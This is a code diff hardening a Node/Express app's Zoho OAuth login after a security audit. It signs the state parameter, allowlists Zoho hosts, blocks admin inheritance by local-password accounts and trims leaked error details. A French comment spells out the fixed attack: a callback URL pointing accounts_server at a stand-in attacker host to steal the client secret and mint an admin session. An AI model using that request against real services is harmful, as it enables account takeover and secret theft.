@@ -3625,7 +3625,11 @@ const authenticateToken = async (req, res, next) => {
                   (SELECT status FROM local_users WHERE LOWER(email) = LOWER($1) LIMIT 1) AS local_status`,
           [user.email]
         );
-        realIsAdmin = r.rows[0]?.is_admin === true;
+        // SECURITY (audit 2026-10-14): admin comes from the ZOHO account only. A local (email +
+        // password) token for the same address must never inherit it — otherwise anyone holding
+        // admin:users could invite an admin's address as an external user, set the password
+        // themselves and become admin.
+        realIsAdmin = user.userType !== 'local' && r.rows[0]?.is_admin === true;
         isDemo = r.rows[0]?.demo_mode === true;
         localStatus = r.rows[0]?.local_status ?? null;
         resolved = true;
@@ -4062,9 +4066,29 @@ const ZOHO_CONFIG = {
 // AUTH ROUTES
 // ============================================================================
 
+// ⚠️ SÉCURITÉ (audit 2026-10-14) — Zoho renvoie `accounts_server` dans l'URL de retour (comptes
+// multi-régions). Le croire tel quel permettait à N'IMPORTE QUI d'appeler
+// /api/auth/callback?code=x&accounts_server=https://pirate.example : on postait notre client_secret
+// chez lui, il répondait « Email: <un admin> », et on lui signait une session admin de 7 jours.
+// Seuls les vrais hôtes de comptes Zoho passent ; idem pour l'api_domain où partent ensuite nos
+// appels Books AVEC de vrais jetons.
+const ZOHO_ACCOUNTS_HOST_RE = /^https:\/\/accounts\.zoho\.(com|eu|in|com\.au|jp|ca|sa|uk|com\.cn)$/;
+const ZOHO_API_DOMAIN_RE = /^https:\/\/(www\.)?zohoapis\.(com|eu|in|com\.au|jp|ca|sa|uk|com\.cn)$/;
+function zohoAccountsUrlFrom(value) {
+  if (value == null || value === '') return ZOHO_CONFIG.accounts_url;
+  const v = String(value).trim().replace(/\/+$/, '');
+  return ZOHO_ACCOUNTS_HOST_RE.test(v) ? v : null;
+}
+function zohoApiDomainOk(value) {
+  return value == null || value === '' || ZOHO_API_DOMAIN_RE.test(String(value).trim().replace(/\/+$/, ''));
+}
+
 // 1. Initiate Zoho OAuth
 app.get('/api/auth/zoho', (req, res) => {
-  const state = Math.random().toString(36).substring(7);
+  // `state` SIGNÉ et daté (était Math.random(), jamais vérifié) : le retour n'accepte qu'un
+  // flux commencé ici. `purpose` empêche ce jeton de servir de session (authenticateToken
+  // refuse tout jeton qui porte un purpose).
+  const state = jwt.sign({ purpose: 'zoho-login-state', n: crypto.randomBytes(12).toString('hex') }, JWT_SECRET, { expiresIn: '15m' });
 
   // Only force the Zoho consent screen when explicitly RECONNECTING (?reconsent=1).
   // Zoho re-issues a refresh_token on consent; a normal login doesn't need a new one
@@ -4100,9 +4124,21 @@ app.get('/api/auth/callback', async (req, res) => {
     return res.status(400).json({ error: 'No authorization code' });
   }
 
+  // Flux commencé chez nous ? (state signé, < 15 min)
   try {
-    const accountsUrl = accounts_server || ZOHO_CONFIG.accounts_url;
+    const st = jwt.verify(String(state || ''), JWT_SECRET, { algorithms: ['HS256'] });
+    if (!st || st.purpose !== 'zoho-login-state') throw new Error('wrong purpose');
+  } catch (e) {
+    console.warn('[SECURITY] /api/auth/callback refusé : state invalide ou expiré —', e.message);
+    return res.status(400).send('Connexion expirée ou invalide. Recommencez la connexion depuis Sales Hub.');
+  }
+  const accountsUrl = zohoAccountsUrlFrom(accounts_server);
+  if (!accountsUrl) {
+    console.warn('[SECURITY] /api/auth/callback refusé : accounts_server non Zoho =', String(accounts_server).slice(0, 120));
+    return res.status(400).send('Serveur de comptes non reconnu.');
+  }
 
+  try {
     console.log('OAuth callback received:');
     console.log('Code:', code.substring(0, 20) + '...');
     console.log('accounts_server from Zoho:', accounts_server || 'NOT PROVIDED');
@@ -4136,6 +4172,10 @@ app.get('/api/auth/callback', async (req, res) => {
       api_domain,
       expires_in,
     } = tokenResponse.data;
+    if (!zohoApiDomainOk(api_domain)) {
+      console.warn('[SECURITY] /api/auth/callback refusé : api_domain non Zoho =', String(api_domain).slice(0, 120));
+      return res.status(400).send('Réponse Zoho inattendue.');
+    }
 
     // Fetch actual user information from Zoho
     console.log('📋 Fetching user information from Zoho...');
@@ -4250,12 +4290,8 @@ app.get('/api/auth/callback', async (req, res) => {
     console.error('Zoho API response status:', error.response?.status);
     console.error('Zoho API response data:', JSON.stringify(error.response?.data, null, 2));
     
-    res.status(500).json({ 
-      error: 'Token exchange failed',
-      details: error.message,
-      status: error.response?.status,
-      zohoError: error.response?.data
-    });
+    // Détails dans les journaux seulement — pas renvoyés au navigateur.
+    res.status(500).json({ error: 'Token exchange failed' });
   }
 });
 
@@ -4710,6 +4746,10 @@ app.post('/api/admin/local-users/invite', authenticateToken, async (req, res) =>
     // Autre population, autre risque — ils activent dans la journee.
     const expires = new Date(Date.now() + 7 * 24 * 3600 * 1000);
     const actor = req.user.realAdminEmail || req.user.email || 'unknown';
+    // SECURITY (audit 2026-10-14): an address that already signs in with Zoho cannot ALSO get an
+    // email+password account — that second door would carry the same email, so the same roles.
+    const zohoAccount = (await pool.query(`SELECT 1 FROM user_tokens WHERE LOWER(email) = LOWER($1) LIMIT 1`, [email])).rows[0];
+    if (zohoAccount) return res.status(409).json({ error: 'This address already signs in with Zoho — no external account needed.' });
     const existing = (await pool.query(`SELECT id, status FROM local_users WHERE email = $1`, [email])).rows[0];
     if (existing && existing.status === 'active') {
       return res.status(409).json({ error: 'User already active' });
@@ -11759,7 +11799,7 @@ app.get('/api/auth/zoho-crm', authenticateToken, (req, res) => {
   }
 
   const state = jwt.sign(
-    { email: cible || req.user.realAdminEmail || req.user.email, k: 'crm-oauth', back },
+    { email: cible || req.user.realAdminEmail || req.user.email, k: 'crm-oauth', back, purpose: 'oauth-state' }, // purpose : jamais une session
     process.env.JWT_SECRET,
     { expiresIn: '15m' }
   );
@@ -11810,7 +11850,7 @@ app.get('/api/auth/zoho-desk', authenticateToken, (req, res) => {
     return res.status(400).json({ error: 'as must be an email address' });
   }
   const state = jwt.sign(
-    { email: cible || req.user.realAdminEmail || req.user.email, k: 'desk-oauth', back },
+    { email: cible || req.user.realAdminEmail || req.user.email, k: 'desk-oauth', back, purpose: 'oauth-state' },
     process.env.JWT_SECRET,
     { expiresIn: '15m' }
   );
@@ -11833,9 +11873,13 @@ app.get('/api/auth/crm-callback', async (req, res) => {
     return res.status(400).json({ error: 'No authorization code' });
   }
 
-  try {
-    const accountsUrl = accounts_server || ZOHO_CONFIG.accounts_url;
+  const accountsUrl = zohoAccountsUrlFrom(accounts_server);
+  if (!accountsUrl) {
+    console.warn('[SECURITY] /api/auth/crm-callback refusé : accounts_server non Zoho =', String(accounts_server).slice(0, 120));
+    return res.status(400).send('Serveur de comptes non reconnu.');
+  }
 
+  try {
     const tokenResponse = await axios.post(
       `${accountsUrl}/oauth/v2/token`,
       new URLSearchParams({
